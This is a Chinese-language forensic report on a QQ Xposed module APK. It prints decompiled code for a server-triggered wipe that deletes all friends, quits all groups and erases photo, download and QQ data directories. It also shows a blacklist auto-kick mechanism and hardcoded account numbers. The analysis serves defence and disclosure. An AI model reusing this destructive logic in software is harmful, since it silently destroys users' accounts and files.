# QStory_2.6.2-release.apk 危险代码与硬编码账号分析报告

分析对象：`QStory_2.6.2-release.apk`

SHA256：`75CC93AAE094EE28E6679CBDF82AFA7CD471B82B29AE8F2FEA89289574E944B4`

反混淆源码目录：`deobfuscated_qstory\sources`

结论：该 APK 内存在高危逻辑。它会从服务端获取用户身份与黑名单数据，并在特定身份值或黑名单命中时执行危险操作。最严重的是 `identity < 0` 会触发删除好友、退群、删除本地目录、结束 QQ 任务等毁号/破坏性行为。

## 1. 最高/身份字段

账号身份数据模型位于：

`deobfuscated_qstory\sources\p331\C8799.java`

字段含义：

```java
@InterfaceC8366(name = "uin", ordinal = 1)
public String f24761 = "0";

@InterfaceC8366(name = "nickname", ordinal = 2)
public String f24760 = "\u672a\u77e5";

@InterfaceC8366(name = "identity", ordinal = 3)
public Integer f24759 = 0;

@InterfaceC8366(name = "identityName", ordinal = 4)
public String f24758 = "\u672a\u77e5";

@InterfaceC8366(name = "label", ordinal = 5)
public String f24757 = "";
```

实际含义：

- `f24761`：QQ 号 / uin
- `f24760`：昵称
- `f24759`：身份等级 / identity
- `f24758`：身份名称 / identityName
- `f24757`：标签 / label

多处功能用 `identity` 判断权限：

- `identity >= 1`：普通高级功能判断
- `identity >= 2`：更高权限功能判断
- `identity < 0`：触发毁号/破坏逻辑

也就是说，“最高身份”不是本地固定枚举完全决定的，而是服务端返回的 `identity` 值控制。

## 2. 用户身份从服务端获取并缓存

服务端地址：

`https://qstory.suzhelan.top`

相关源码：

`deobfuscated_qstory\sources\androidx\compose\ui\platform\RunnableC1898.java`

```java
case 18:
    try {
        C6960.m12247();
        Object obj = C8865.m14507().m14493().execute().f15756;
        obj.getClass();
        C8799 c8799 = (C8799) ((QSResult) obj).getData();
        c8799.getClass();
        "user";
        new C8821().m14465(c8799, "user_info");
        if (C6960.m12245()) {
            return;
        }
        C8821 c8821 = new C8821();
        String strM66682 = "token";
        "key";
        c8821.f24812.remove(strM66682);
```

含义：程序会请求服务端用户信息接口，把返回的 `C8799` 用户对象缓存到 `user_info`。后续毁号逻辑读取的也是这个缓存。

## 3. 启动时触发身份刷新、毁号检查、黑名单获取

相关源码：

`deobfuscated_qstory\sources\androidx\compose\ui\platform\RunnableC1898.java`

```java
case 9:
    try {
        AbstractC8804.f24777.execute(new RunnableC1898(new C6960(), 18));
        AbstractC3064.m6765();
        C4484 c4484 = new C4484(3);
        int i8 = 24;
        if (!"F621AA19C7A5F139F315853F40A7E24F".equals(c4484.m9064())) {
            AbstractC6154.m11561("[QS]\u6a21\u5757\u906d\u5230\u7be1\u6539 \u8bf7\u91cd\u65b0\u4e0b\u8f7d");
            new C6864(new C2558(i8)).start();
        }
        new C6864(new C1030(c4484, i8)).start();
        ArrayList arrayList = AbstractC8802.f24775;
        C8865.m14510().m14506().mo11106(new C6957(i8));
        return;
    } catch (Exception e4) {
```

含义：

1. 异步刷新用户信息。
2. 调用 `AbstractC3064.m6765()` 检查是否毁号。
3. 校验签名。
4. 请求服务端黑名单 `/user-v2/queryBlacklist`。

## 4. 毁号/破坏性核心代码

危险源码完整位置：

`deobfuscated_qstory\sources\com\bumptech\glide\AbstractC3064.java`

```java
public static void m6765() {
    try {
        C8799 c8799 = new C8799();
        c8799.f24761 = "0";
        c8799.f24760 = "\u672a\u540c\u6b65";
        c8799.f24759 = 0;
        c8799.f24758 = "\u672a\u540c\u6b65";
        C8799 c87992 = (C8799) new C8821().m14466(C8799.class, "user_info");
        if (c87992 != null) {
            c8799 = c87992;
        }
        if (c8799.f24759.intValue() < 0) {
            Iterator<FriendInfo> it = QQFriendTool.getAllFriend().iterator();
            while (it.hasNext()) {
                QQFriendTool.deleteFriend(it.next().uin);
            }
            Iterator it2 = AbstractC9124.m14671().iterator();
            while (it2.hasNext()) {
                QQNTTroopSettingTool.quitGroup(((GroupInfo) it2.next()).GroupUin);
            }
            String[] strArr = {"/storage/emulated/0/Pictures/", "/storage/emulated/0/DCIM/", "/storage/emulated/0/Download/", "/data/data/com.tencent.mobileqq/", "/data/user/0/com.tencent.mobileqq/"};
            for (int i = 0; i < 5; i++) {
                AbstractC0455.m1161(new File(strArr[i]));
            }
            Iterator<ActivityManager.AppTask> it3 = ((ActivityManager) AbstractC6340.f17460.getApplicationContext().getSystemService("activity")).getAppTasks().iterator();
            while (it3.hasNext()) {
                it3.next().finishAndRemoveTask();
            }
        }
    } catch (Exception unused) {
    }
}
```

危险含义：

- 当服务端返回或本地缓存的 `identity < 0` 时触发。
- 删除全部 QQ 好友：`QQFriendTool.getAllFriend()` + `QQFriendTool.deleteFriend(...)`
- 退出全部群：`AbstractC9124.m14671()` + `QQNTTroopSettingTool.quitGroup(...)`
- 删除本地目录：
  - `/storage/emulated/0/Pictures/`
  - `/storage/emulated/0/DCIM/`
  - `/storage/emulated/0/Download/`
  - `/data/data/com.tencent.mobileqq/`
  - `/data/user/0/com.tencent.mobileqq/`
- 结束应用任务：`finishAndRemoveTask()`
- 异常被直接吞掉：`catch (Exception unused) {}`，用户不容易看到失败原因或报警日志。

## 5. 服务端黑名单与自动踢人

接口定义：

`deobfuscated_qstory\sources\p348\InterfaceC8864.java`

```java
@InterfaceC9078("/user-v2/onKickBlacklist")
@InterfaceC9063
InterfaceC5777<QSResult<Integer>> m14505(
    @InterfaceC9065("troop") String troop,
    @InterfaceC9065("troopName") String troopName,
    @InterfaceC9065("operator") String operator,
    @InterfaceC9065("operatorName") String operatorName,
    @InterfaceC9065("uin") String uin,
    @InterfaceC9065("uinName") String uinName,
    @InterfaceC9065("reason") String reason
);

@InterfaceC9062("/user-v2/queryBlacklist")
InterfaceC5777<QSResult<List<String>>> m14506();
```

含义：

- `/user-v2/queryBlacklist`：从服务端获取黑名单 QQ 号列表。
- `/user-v2/onKickBlacklist`：踢人后向服务端上报群、操作者、被踢用户、原因。

黑名单回调：

`deobfuscated_qstory\sources\p075\C6957.java`

```java
public void onResponse(InterfaceC5777 interfaceC5777, C5754 c5754) {
    QSResult qSResult;
    "call";
    "response";
    if (!c5754.f15757.f17003 || (qSResult = (QSResult) c5754.f15756) == null) {
        return;
    }
    ArrayList arrayList = AbstractC8802.f24775;
    Object data = qSResult.getData();
    "getData(...)";
    data.getClass();
    AbstractC8802.f24775 = new ArrayList((Collection) data);
    new C6864(new C8801(4)).start();
}
```

含义：服务端返回的黑名单列表直接赋值给 `AbstractC8802.f24775`。

## 6. 触发踢人的核心代码

相关源码：

`deobfuscated_qstory\sources\p333\AbstractC8802.java`

```java
public static ArrayList f24775 = new ArrayList();

public static final ArrayList f24774 = new ArrayList();

public static final void m14451(String str, String str2, String str3) {
    AbstractC6136.m11546(-3937706981486495143L, -3937586675157566887L, str);
    str2.getClass();
    "reason";
    if (f24774.contains(str) && m14452(str2)) {
        QQNTTroopTool.kickMember(str, str2, true);
        InterfaceC8864 interfaceC8864M14510 = C8865.m14510();
        String groupName = QQNTTroopTool.getGroupName(str);
        "getGroupName(...)";
        groupName.getClass();
        String currentUin = QQEnvTool.getCurrentUin();
        "getCurrentUin(...)";
        currentUin.getClass();
        String currentAccountNickName = QQEnvTool.getCurrentAccountNickName();
        "getCurrentAccountNickName(...)";
        currentAccountNickName.getClass();
        String memberName = QQNTTroopTool.getMemberName(str, str2);
        "getMemberName(...)";
        memberName.getClass();
        interfaceC8864M14510.m14505(str, groupName, currentUin, currentAccountNickName, str2, memberName, str3).mo11106(new C6960(24));
    }
}

public static final boolean m14452(String str) {
    "uin";
    str.getClass();
    if (str.equals("0")) {
        return false;
    }
    return f24775.contains(str);
}
```

含义：

- `f24775`：服务端黑名单 QQ 号列表。
- `f24774`：当前用户有管理员/群主权限的群列表。
- 如果“当前群在可管理群列表里”且“用户 QQ 在黑名单里”，就调用 `QQNTTroopTool.kickMember(str, str2, true)` 踢人。
- 本地只看到硬编码排除 `"0"`，没有在这段核心踢人代码里看到固定 QQ 号豁免。

触发点：

`deobfuscated_qstory\sources\lin\xposed\hook\javaplugin\PluginCallback.java`

```java
public static void onJoinTroop(String str, String str2, String str3) {
    if (AbstractC8802.m14452(str2)) {
        AbstractC8802.m14451(str, str2, "onJoin");
    }
    PluginManager.invokeInAllScriptCallbackMethod("onTroopEvent", str, str2, 2);
    PluginManager.invokeInAllScriptCallbackMethod("onTroopEvent", str, str2, str3, 2);
}

public static void onMessage(MessageData messageData) {
    if (AbstractC8802.m14452(messageData.UserUin)) {
        AbstractC8802.m14451(messageData.GroupUin, messageData.UserUin, "onMsg");
    }
    PluginManager.invokeInAllScriptCallbackMethod("onMsg", messageData);
}
```

含义：

- 用户进群时触发：`onJoinTroop`
- 用户发消息时触发：`onMessage`
- 这两个入口都会检查黑名单并可能踢人。

## 7. 自动收集当前账号为管理员/群主的群

相关源码：

`deobfuscated_qstory\sources\p332\C8801.java`

```java
case 4:
    for (GroupInfo groupInfo : AbstractC9124.m14671()) {
        String str = groupInfo.GroupUin;
        int i = AbstractC8850.f24956;
        String strM11557 = AbstractC6136.m11557(-3937678772141295015L, new StringBuilder(), str);
        if (AbstractC8851.m14491(str) && AbstractC8851.f24959.m14643(String.class, strM11557).contains(QQEnvTool.getCurrentUin())) {
            zBooleanValue = true;
        } else {
            Object objM14669 = AbstractC9124.m14669(str);
            C9125 c9125M14679 = C9125.m14679(objM14669);
            c9125M14679.f25504 = "isOwnerOrAdmin";
            c9125M14679.f25506 = Boolean.TYPE;
            zBooleanValue = ((Boolean) c9125M14679.m14682(objM14669, new Object[0])).booleanValue();
        }
        if (zBooleanValue) {
            ArrayList arrayList = AbstractC8802.f24774;
            String str2 = groupInfo.GroupUin;
            "GroupUin";
            str2.getClass();
            arrayList.add(str2);
        }
    }
    return C5175.f14739;
```

含义：程序会遍历所有群，判断当前 QQ 是否是群主或管理员，把这些群加入 `f24774`。只有这些群里才会执行黑名单踢人。

## 8. 已解密出的硬编码 QQ 号

字符串解密表：

`deobfuscated_qstory\m6668_strings.tsv`

已解密到的疑似 QQ 号：

```text
638537273
2971017318
```

使用位置：

`deobfuscated_qstory\sources\p043\C6444.java`

```java
if (setM10020.size() == 0) {
    this.f17671.add("2971017318");
    this.f17671.add("638537273");
}
```

`deobfuscated_qstory\sources\p043\C6448.java`

```java
if (setM10020.size() == 0) {
    this.f17683.add("2971017318");
    this.f17683.add("638537273");
}
```

上下文显示这两个号被加入 `需要检测群.json` 对应的默认集合。也就是说，它们在这两处源码里更像“默认检测群号/默认配置项”，不是直接出现在毁号函数或黑名单踢人豁免判断中。

另一个解密数字：

```text
114514
```

使用位置：

```java
intent.putExtra("ptt_forward", "114514");
```

它用于语音/转发相关标记，不是 QQ 号豁免证据。

## 9. 关于“豁免 QQ 号”的核验结论

已核验结果：

- 核心黑名单踢人函数 `AbstractC8802.m14452` 只硬编码排除了 `"0"`。
- 没有在 `AbstractC8802.m14451/m14452`、`PluginCallback.onJoinTroop/onMessage`、`queryBlacklist` 回调链里发现某个 QQ 号被硬编码豁免。
- `2971017318`、`638537273` 是已解密出的硬编码账号/群号样式字符串，但当前证据显示它们用于默认检测集合，不是毁号豁免。
- 真正能决定毁号与否的是服务端返回并缓存的 `identity` 字段；只要 `identity < 0`，本地就会执行毁号逻辑。

因此，“豁免 QQ 号”如果存在，更可能在服务端逻辑里，而不是当前 APK 本地核心踢人/毁号代码里。

## 10. 风险评级

风险等级：严重 / 高危

原因：

- APK 是 Xposed 模块，运行在 QQ 进程上下文，实际权限远高于普通 APK。
- 存在服务端控制身份字段的逻辑。
- 存在本地毁号代码，触发条件是 `identity < 0`。
- 存在服务端黑名单踢人代码，触发点覆盖进群和发消息。
- 破坏代码会删除好友、退出群、删除目录并结束任务。

## 11. 建议

- 不建议继续启用该模块。
- 如果已经启用，建议立即停用 Xposed 模块并备份 QQ 数据。
- 不要登录重要 QQ 号测试。
- 可保留本报告和源码路径作为证据。
- 如果需要继续取证，应重点抓包或审计服务端接口：
  - `https://qstory.suzhelan.top/user/info`
  - `https://qstory.suzhelan.top/user-v2/queryBlacklist`
  - `https://qstory.suzhelan.top/user-v2/onKickBlacklist`
